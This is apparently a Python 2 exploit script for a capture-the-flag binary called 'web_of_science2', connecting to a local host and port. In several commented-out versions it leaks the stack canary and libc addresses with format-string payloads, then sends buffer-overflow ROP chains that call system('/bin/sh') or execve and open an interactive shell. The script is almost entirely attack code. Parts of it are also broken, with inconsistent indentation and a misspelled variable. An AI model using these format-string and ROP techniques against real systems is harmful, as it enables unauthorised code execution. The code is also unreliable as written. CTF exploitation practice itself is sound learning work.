from pxwn import *

exp = Exploit("web_of_science2",64)
gadget1 = exp.rop("prdi")
gadget2 = exp.rop("prsi")
gadget3 = exp.rop("ppr")
gadget4 = exp.rop("pppr")
gadget5 = exp.rop("ppppr")
gadget6 = exp.rop("/bin/sh")
gadget7 = exp.rop("leave")
shellcode = exp.normal(1)

#================================================
#================================================
print "=" * 30
if gadget1 != "Gadgets Not Found!":
    print "pop rdi:" + hex(gadget1)
else:
    print gadget1

"""
print "=" * 30


print "=" * 30

if gadget2 != "Gadgets Not Found!":
    for i in gadget2:
        print "pop rsi: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget2

print "=" * 30

if gadget3 != "Gadgets Not Found!":
    for i in gadget3:
        print "pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget3

print "=" * 30

print "=" * 30
if gadget4 != "Gadgets Not Found!":
    for i in gadget4:
            print "pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget4

print "=" * 30

print "=" * 30
if gadget5 != "Gadgets Not Found!":
    for i in gadget5:
        print "pop pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget5

print "=" * 30
"""

"""
def viewpaperinfo(p,data):
    p.sendl(data)
    p.recvul(":")
    p.sendl("0")
    p.recvul("Abstract:")
    p.recvul("\t")
    leak = p.recvl()
    leak = leak.split(".")
    system = int(leak[1],16)-0x37a3a0
    binsh = int(leak[1],16)-0x243d05
    canary = int(leak[16],16)
    print green("Canary: "),hex(canary)
    print green("System: "),hex(system)
    print green("Binsh: "),hex(binsh)
    p.recvul("URL:")
    p.recvul("\t")
    p.recvl()

    return (canary,system,binsh)


def addcontent(p,data):
    if data == "1":
        p.sendl(data)
        p.recvul(":")
        p.sendl("Hello"*5)
        p.recvl()
    if data == "2":
        p.sendl(data)
        p.recvul(":")
        p.sendl("Hello"*5)
        p.recvl()
    if data == "3" or data == "4" or data == "5":
        p.sendl(data)
        p.recvul(":")
        p.sendl("%p."*20)
        p.recvl()
    if data == "6":
        p.sendl(data)
        p.recvul(":")
        p.sendl("1000")
        p.recvul(":")
        p.sendl("1")
    if data == "7":
        p.sendl(data)
        p.recvul("Abstract:")
        p.recvul("\t")
        leak = p.recvl()
        leak = leak.split(".")
        print leak
        p.recvul("Tags:")
        p.recvul("\t")
        leak2 = p.recvl()
        p.recvul("URL:")
        p.recvul("\t")
        leak3 = p.recvl()

def addsigseg(p,data):
    p.sendl(data)
    p.recvul(":")
    p.sendl("AAAAAAA."+"%s.")
    p.recvl()


def exploit(p,canary,system,binsh):
    addcontent(p,"1")
    addcontent(p,"2")
    addsigseg(p,"3")
    addsigseg(p,"4")
    addsigseg(p,"5")
    p.recvul(">")
    p.sendl("8")
    p.recvul(">")
    p.sendl("4")
    p.recvul(":")
    p.sendl("1")
    p.recvul(">")
    p.sendl("1")
    p.recvul(">")
    p.sendl("1")
    p.recvul(":")
    p.sendl("A"*72+pk64(cananry)+"B"*8+pk64(gadget1)+pk64(binsh)+pk64(system))


"""
#=========================================================

local=False

if local:
    p = process("./web_of_science2")
    pause()
    p.debug()
else:
    HOST = "localhost"
    PORT = 45678
    p = connect(HOST,PORT)
    pause()
    p.debug()

#=========================================================

"""
p.recvl()
p.sendl("Hello")
p.recvl()
p.recvl()
for i in range(10):
    buf = p.recvl()
    buf = buf.replace(" = ?","",1).strip("\n")
    buf = str(eval(buf))
    print "Answer: " + buf
    p.recvul(":")
    p.sendl(buf)
    p.recvl()


p.recvul(">")
p.sendl("1")
p.recvul(">")
addcontent(p,"1")
p.recvul(">")
addcontent(p,"2")
p.recvul(">")
addcontent(p,"3")
p.recvul(">")
addcontent(p,"4")
p.recvul(">")
addcontent(p,"5")
p.recvul(">")
addcontent(p,"7")
p.recvul(">")
p.sendl("8")
p.recvul(">")
p.sendl("3")

p.recvul(":")
p.recvl()
p.recvl()
p.recvul(">")

canary,system,binsh = viewpaperinfo(p,"4")

#fuckign exploit
p.recvul(">")
p.sendl("1")
p.recvul(">")
exploit(p,canary,system,binsh)

#this solution is janky
"""
"""

version 2
prdi = 0x00000000004016b3 # pop rdi; ret;
prsi = 0x00000000004016b1 # pop rsi; r15; ret;
#prdx

p.recvl()
p.sendl("%p."*70)
p.recvl()
buf = p.recvl()
buf = buf.replace(" = ?","",1)
buf = str(eval(buf))
print "Answer: " ,buf
leak = p.recvul(":")
leak = leak.split(".")

binsh = int(leak[4],16)-0x241465
system = int(leak[4],16)-0x377b00
canary = int(leak[42],16)
syscall = int(leak[42],16)

p.sendl(buf)
for i in range(0,8):
    buf = p.recvl()
    buf = buf.replace(" = ?","",1)
    buf = str(eval(buf))
    print "Answer: ",buf
    p.recv(1024)
    p.sendl(buf)

p.recvl()
p.recv(1024)
p.sendl("A"*136+pk64(canary)+"B"*24+pk64(gadget1)+pk64(binsh)+pk64(system))
p.interactive()
"""
"""
#version 3 

p.recvl()
p.sendl("%p."*70)
p.recvl()
buf = p.recvl()
buf = buf.replace(" = ?","",1)
buf = str(eval(buf))
print "Answer: " ,buf
leak = p.recvul(":")
leak = leak.split(".")

binsh = pk64(int(leak[4],16)-0x241465)
system = pk64(int(leak[4],16)-0x377b00)
canary = pk64(int(leak[42],16))
libc = int(leak[4],16)-0x3be140
rax = pk64(libc+0x00048858)
rsi = pk64(libc+0x00024805)
rdx = pk64(libc+0x000bcee0)
rdi = pk64(gadget1)
syscall = pk64(libc+0x000c1e55)
execv = pk64(59)
junk1 = pk64(0)
junk2 = pk64(0)

p.sendl(buf)

for i in range(0,8):
    buf = p.recvl()
    buf = buf.replace(" = ?","",1)
    buf = str(eval(buf))
    print "Answer: ",buf
    p.recv(1024)
    p.sendl(buf)

p.recvl()
p.recv(1024)
p.sendl("A"*136+canary+"B"*24+rax+execv+rdi+binsh+rsi+junk1+rdx+junk2+syscall)
p.interactive()

"""


